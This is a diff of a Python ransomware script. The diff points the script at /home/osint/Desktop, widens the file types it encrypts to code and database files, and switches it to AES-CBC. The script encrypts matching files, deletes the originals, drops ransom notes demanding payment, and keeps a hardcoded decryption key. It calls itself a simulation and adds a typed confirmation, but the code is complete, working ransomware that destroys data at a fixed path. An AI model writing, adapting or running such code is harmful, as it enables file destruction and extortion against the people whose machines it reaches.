@@ -1,13 +1,14 @@
 import os
 import base64
 import getpass
-from cryptography.fernet import Fernet
-from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+import sys
+from Crypto.Cipher import AES
+from Crypto.Protocol.KDF import PBKDF2
+from Crypto.Util.Padding import pad, unpad
 
-# Configuration - Now targets current directory safely
-TARGET_DIRS = ["."]  # Encrypt files in current directory
-FILE_EXTENSIONS = ['.txt', '.doc', '.xls', '.jpg', '.png', '.pdf', '.csv']
+# Configuration - Targets /home/osint/Desktop directory
+TARGET_DIRS = ["/home/osint/Desktop"]  # Specific target directory
+FILE_EXTENSIONS = ['.txt', '.doc', '.xls', '.jpg', '.png', '.pdf', '.csv', '.py', '.db', '.sql', '.config']
 SALT = b'rans0m_salt_!@#$'  # For key derivation
 RANSOM_NOTE = """
 !!! YOUR FILES HAVE BEEN ENCRYPTED !!!
@@ -29,80 +30,97 @@ WARNING:
 DECRYPTION_KEY = "Abhishek!234@#$"
 
 def derive_key(password):
-    """Derive encryption key from password"""
-    kdf = PBKDF2HMAC(
-        algorithm=hashes.SHA256(),
-        length=32,
-        salt=SALT,
-        iterations=100000
-    )
-    return base64.urlsafe_b64encode(kdf.derive(password.encode()))
+    """Derive encryption key from password using PBKDF2"""
+    return PBKDF2(password.encode(), SALT, dkLen=32, count=100000)
 
-def encrypt_file(path, fernet):
-    """Encrypt a file and replace original"""
+def encrypt_file(path, key):
+    """Encrypt a file using AES-CBC"""
     try:
         # Skip the script itself
         if path == os.path.abspath(__file__):
             return False
             
+        # Generate random IV
+        iv = os.urandom(16)
+        
         with open(path, 'rb') as f:
             data = f.read()
         
-        encrypted_data = fernet.encrypt(data)
+        # Encrypt data
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        encrypted_data = iv + cipher.encrypt(pad(data, AES.block_size))
+        
+        # Write encrypted file
         with open(path + '.encrypted', 'wb') as f:
             f.write(encrypted_data)
         
+        # Remove original
         os.remove(path)
         return True
-    except Exception:
+    except Exception as e:
+        print(f"Error encrypting {path}: {str(e)}")
         return False
 
-def decrypt_file(path, fernet):
-    """Decrypt a file and restore original"""
+def decrypt_file(path, key):
+    """Decrypt a file using AES-CBC"""
     try:
         with open(path, 'rb') as f:
             data = f.read()
         
-        decrypted_data = fernet.decrypt(data)
+        # Extract IV and ciphertext
+        iv = data[:16]
+        ciphertext = data[16:]
+        
+        # Decrypt data
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
+        
+        # Write decrypted file
         original_path = path.replace('.encrypted', '')
         with open(original_path, 'wb') as f:
             f.write(decrypted_data)
         
+        # Remove encrypted file
         os.remove(path)
         return True
-    except Exception:
+    except Exception as e:
+        print(f"Error decrypting {path}: {str(e)}")
         return False
 
 def process_files(mode, password):
     """Encrypt/decrypt files in target directories"""
-    try:
-        key = derive_key(password)
-        fernet = Fernet(key)
-    except:
-        return 0, 0  # Key derivation failure
-
+    key = derive_key(password)
     total_files = 0
     success_count = 0
 
     for target_dir in TARGET_DIRS:
         if not os.path.exists(target_dir):
+            print(f"Target directory not found: {target_dir}")
             continue
             
         for root, _, files in os.walk(target_dir):
             for file in files:
                 full_path = os.path.join(root, file)
                 
+                # Skip directories
+                if os.path.isdir(full_path):
+                    continue
+                    
+                # Skip the script itself
+                if full_path == os.path.abspath(__file__):
+                    continue
+                    
                 # Encryption mode
                 if mode == 'encrypt':
                     if any(file.endswith(ext) for ext in FILE_EXTENSIONS) and not file.endswith('.encrypted'):
                         total_files += 1
-                        if encrypt_file(full_path, fernet):
+                        if encrypt_file(full_path, key):
                             success_count += 1
                 
                 # Decryption mode
                 elif mode == 'decrypt' and file.endswith('.encrypted'):
                     total_files += 1
-                    if decrypt_file(full_path, fernet):
+                    if decrypt_file(full_path, key):
                         success_count += 1
 
     return total_files, success_count
@@ -136,11 +154,11 @@ def main():
     """Main ransomware simulation"""
     # Encryption mode
     if not any_encrypted_files():
-        print("Starting file encryption...")
+        print(f"Starting file encryption in {TARGET_DIRS[0]}...")
         total, success = process_files('encrypt', DECRYPTION_KEY)
         create_ransom_notes()
         show_ransom_note()
-        print(f"Encrypted {success}/{total} files in current directory")
+        print(f"Encrypted {success}/{total} files in {TARGET_DIRS[0]}")
         print("\nRun this program again to enter decryption key after payment\n")
         return
 
@@ -172,17 +190,18 @@ def main():
     print("\nPERMANENT DATA LOSS! Send payment immediately to recover files")
 
 if __name__ == "__main__":
-    # Important safety checks
-    script_name = os.path.basename(__file__)
-    print(f"Running ransomware simulation ({script_name}) - Files in current directory will be encrypted!")
+    # Check if we're in the home directory
+    cwd = os.getcwd()
+    if cwd.startswith('/home/osint/Desktop'):
+        print("WARNING: Do not run from the target directory!")
+        print("Move this script to a different location (e.g., /tmp) before executing")
+        sys.exit(1)
     
-    # Skip encryption if already encrypted files present
-    if any_encrypted_files():
-        print("Encrypted files detected - entering decryption mode")
+    # Confirm before executing
+    print("WARNING: This will encrypt all files in /home/osint/Desktop")
+    confirm = input("Type 'CONFIRM' to proceed: ")
+    
+    if confirm.strip().upper() == 'CONFIRM':
         main()
     else:
-        confirm = input("Type 'ENCRYPT' to start file encryption: ")
-        if confirm.strip().upper() == 'ENCRYPT':
-            main()
-        else:
-            print("Encryption cancelled")
+        print("Operation cancelled")
